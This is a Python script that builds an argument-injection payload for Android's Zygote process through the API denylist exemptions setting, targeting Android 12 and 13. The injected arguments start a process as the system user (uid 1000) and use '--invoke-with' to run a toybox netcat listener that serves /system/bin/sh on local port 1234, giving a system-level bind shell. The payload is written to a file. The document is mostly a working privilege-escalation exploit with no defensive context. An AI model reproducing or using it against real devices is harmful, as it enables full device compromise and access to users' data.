def main():
    prefix_str = '\n--set-api-denylist-exemptions\n'

    send_buffer_size = 8192
    # anroid 12
    max_recv_size = 12200
    # android 13
    # FIXME: this will cause issues with calculations
    # max_recv_size = 32768

    # TODO
    args = [
        '--runtime-args',
        '--setuid=1000',
        '--setgid=1000',
        '--runtime-flags=2049',
        # this doesn't exist on android 12
        # '--mount-external-full',
        '--mount-external-default',
        '--target-sdk-version=29',
        '--setgroups=3003',
        '--nice-name=runnetcat',
        '--seinfo=network_stack:privapp:targetSdkVersion=29:complete',
        '--invoke-with',
        'toybox nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l;',
        '--instruction-set=arm',
        '--app-data-dir=/data/',
        '--package-name=com.android.settings',
        'android.app.ActivityThread',
    ]

    arg_str = f'{len(args)}\n' + '\n'.join(args)

    # -1 for newline at end of first setting
    remain_count = max_recv_size - send_buffer_size - len(arg_str) - 1
    extra_settings_count = remain_count // 2

    send_payload = f'{2 + extra_settings_count}{prefix_str}{'\n' * (extra_settings_count + 1)}'
    pad_count = send_buffer_size - len(send_payload)
    send_payload += 'a' * pad_count + '\n'

    settings_payload = '\n' * (extra_settings_count + 1) + 'a' * pad_count + arg_str + ',a' * extra_settings_count

    print(settings_payload)

    real_args = settings_payload.split(',')
    real_send_payload = f'{len(real_args) + 1}{prefix_str}' + '\n'.join(real_args) + '\n'
    print(len(real_args))
    assert len(real_args) <= max_recv_size // 2
    print(len(real_send_payload))
    assert len(real_send_payload) <= max_recv_size

    with open('payload', 'w') as f:
        f.write(settings_payload)


if __name__ == '__main__':
    main()
